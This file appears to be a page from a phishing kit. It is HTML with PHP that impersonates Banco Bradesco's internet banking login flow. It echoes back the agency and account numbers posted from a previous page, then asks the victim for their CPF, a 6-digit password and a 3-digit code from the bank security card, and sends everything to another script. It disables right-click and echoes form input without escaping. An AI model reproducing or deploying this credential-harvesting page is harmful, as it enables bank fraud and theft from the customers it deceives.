<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link href="stylos/style.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="icones/opera.ico"/>
<title>Banco Bradesco | Pessoa Física, Exclusive, Prime e Private</title>
<script type="text/javascript" src="scripts/data.js"></script>
<script type="text/javascript" src="j_query/divOculta.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.2.6.js"></script>
<script type="text/javascript" src="j_query/google_Analytics.js"></script>
<script type="text/javascript" src="scripts/validaCam.js"></script>
<script type="text/javascript" src="scripts/validaCPF.js"></script>
<script type="text/javascript" src="scripts/pulacampo.js"></script>
<style type="text/css">
<!--
body {background-color:#E4E4E4;}
a:link {color: #666666;text-decoration:none;}
a:visited {color:#333333;text-decoration:none;}
a:hover {color:#990000;text-decoration:underline;}
a:active {color:#333333;text-decoration:none;}
.style6 {color: #E5E5E5}
.style7 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px;	color: #333333;}
.style8 {	font-size: 14px;	color: #FF0000;}
.style9 {
	color: #666666;
	font-weight: bold;
}
.style12 {color: #666666; font-style: italic; }
.style13 {	font-family: Arial, Helvetica, sans-serif;	font-size: 14px;	color: #333333;}
.style14 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px;}
.style16 {	color: #666666;	font-size: 10px;	font-family: Verdana, Arial, Helvetica, sans-serif;}
.style18 {	font-size: 10px;	color: #666666;
}
.style20 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #666666;
}
-->
</style>

<script type="text/javascript">
	$(document).ready(function(){
		$('#info').hide();
		var size  =  $('#sss6').attr("size");
		$('#sss6').keyup(function(){
			var entry = $(this).attr("value");
			var current_length = $(this).attr("value").length;
			if (current_length>= size) {
				$('#info').html();
				$('#info').show('fast');
			}
				else $('#info').hide('fast');
			});
	});

</script>

</head>

<body style="margin:0;" oncontextmenu="return false" >
<div id="humTop1"><div id="coloCancela"> 

<div id="dentrotopo01">

<table cellpadding="0" cellspacing="0">
<tr>
<td width="105" height="18""40" class="style6" width-><?php echo("<b>Ag&ecirc;ncia:&nbsp;</b>".$_POST['agencia']."");?></td>
<td width="280""40" class="style6" width- ><?php echo("<b>Conta:&nbsp;</b>".$_POST['conta']."");?><?php echo("-".$_POST['digito']."");?></td>
</tr>
</table>

</div>

<A href="index.php"><img src="images/buttoncancelar.jpg" border="0" style="float:right;" /></A></div>
</div>
<div id="tela">
<div id="ilRight"></div>
<div id="ilLeft"></div>
</div>
<div id="humTop2"><div id="relogio"><script>data();</script></div></div>
<div id="humTop3"></div>
<div id="humTop4"></div>

<div id="corpoAll">
<div id="frameBox1">
<div id="lineRss">
  <div class="style7" style="width:500px; height:20px; margin-left:10px; float:left; padding: 8px 0 0 0;">
  <span class="style12">P&aacute;gina Inicial  </span>  <span class="style8">&gt;</span><span class="style9">  Dados pessoais </span>  </span><span class="style8">&gt;</span> </div> 
  <img src="images/AAA.jpg" style="float:right;" /></div>
<div id="lineRaa"></div>
 <div id="infDados">
<img src="images/Passo1.jpg"  />
<div style="width:200px; height:10px; margin-top:20px; margin-left:10px;"><span class="style13">Informe os seguintes dados</span></div>
<table cellpadding="0" cellspacing="0">
<form id="form" name="form" action="dados_ibk2.php" method="post" onsubmit="return CampoObrigatorio(this)" >
<tr>
<td height="27" colspan="3">
	    <input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
        <input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
        <input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" />
        <input name="infor" type="hidden" id="infor" value="<?php echo $_POST['infor']; ?>" /></td>
</tr>
<tr>
<td width="25" height="33">&nbsp;</td>
<td width="89" height="33"><span class="style7">Pai/Tutor:</span></td>
<td height="33"><input type="text" name="responssavel" id="responssavel" lang="1" /></td>
</tr>
<tr>
<td width="25" height="33">&nbsp;</td>
<td width="89" height="33" class="style7">CPF:</td>
<td height="33"><input name="cpf" type="text" id="cpf" lang="1" xml:lang="1" maxlength="11" onblur="return validacpf()" onkeyup="javascript:pulacampo('cpf','sss6')" />
  <img src="images/asomente29847293824.png" width="111" height="10" /></td>
</tr>
<tr>
<td width="25" height="30">&nbsp;</td>
<td width="89" height="30" class="style7">Senha de (6): </td>
<td width="571" height="30"><input name="sss6" type="password" id="sss6" lang="1" size="6" maxlength="6" /><img src="images/asenhadocarta2347293422984.png" /></td>
</tr>
<tr>
<td height="70">&nbsp;</td>
<td colspan="4">

<div id="info">

<table cellpadding="0" cellspacing="0">
<tr>
<td width="133" height="100"><div align="right" class="style14"> 
  <div align="left">Preencha o campo ao<br /> 
    lado com a
    <strong>chave</strong><br />
    
    indicada no verso do<br />
    seu cart&atilde;o,
    conforme posi&ccedil;&atilde;o solicitada.</div>
</div></td>
<td width="207"><div align="center"><img src="images/tatatatatatata.gif" width="188" height="97" /></div></td>
<td width="208">
<table cellpadding="0" cellspacing="0">
<tr>
<td width="190" height="31"><span class="style14"><strong>Posi&ccedil;&atilde;o 06</strong> no verso do cart&atilde;o:</span></td>
</tr>
<tr>
<td height="23"><input type="password" name="pos06" id="pos06" size="3" maxlength="3" lang="1" />   <span class="style20">(3 d&iacute;gitos)</span></td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
</table></td>
</tr>
</table>
</div></td>
</tr>
<tr>
<td height="19">&nbsp;</td>
<td colspan="4" background="images/asdasdasd.jpg"><a href="index.php"><span class="style14" style="float:left;"><span class="style8">&lt;</span> <span class="style16">&Iacute;NICIO</span></span></a>

  <input name="button" id="button" type="image" src="images/Continuar.jpg" style="float:right;"/></td>
</tr>
<tr>
<td height="19">&nbsp;</td>
<td colspan="4"><div align="center" class="style14 style18"></div></td>
</tr>
</form>
</table>

</div>

<table align="right" cellpadding="0" cellspacing="0" style="border-left:1px solid #E5E5E5; margin-top:35px;">
<tr>
<td width="242" height="133" ><div align="center"><a href="#"><img src="images/a2836472346238.jpg" width="216" height="103" border="0" /></a></div></td>
</tr>
<tr>
  <td><div align="center" class="style6">_________________________</div></td>
</tr>
<tr>
<td width="242" height="104" ><div align="center"><a href="#"><img src="images/a29839242342.jpg" width="216" height="75" border="0" /></a></div></td>
</tr>
<tr>
  <td height="20">&nbsp;</td>
</tr>
</table>
</div>
</div>

<div id="roda01">
<div id="roda02">
<div id="roda03">
<table width="205" align="center">
<tr>
<td width="197" height="96"><img src="images/rrb237894792749.jpg" width="197" height="52" title="Bradesco Dia e Noite" /></td>
</tr>
</table>
</div><!--roda03-->
<div id="a9485279324">
<table width="734" cellpadding="0" cellspacing="0">
<tr>
<td width="371" height="28" align="center" style=" font-family:Verdana, Geneva, sans-serif; font-size:12px;border-right:1px solid #CCC;""><a href="#">Seguran&ccedil;a</a></td>
<td width="10">&nbsp;</td>
<td width="351"align="center" style=" font-family:Verdana, Geneva, sans-serif;font-size:12px;"><a href="#">Fale Conosco</a></td>
</tr>
</table>
</div><div id="roda05"></div></div></div>

</body>
</html>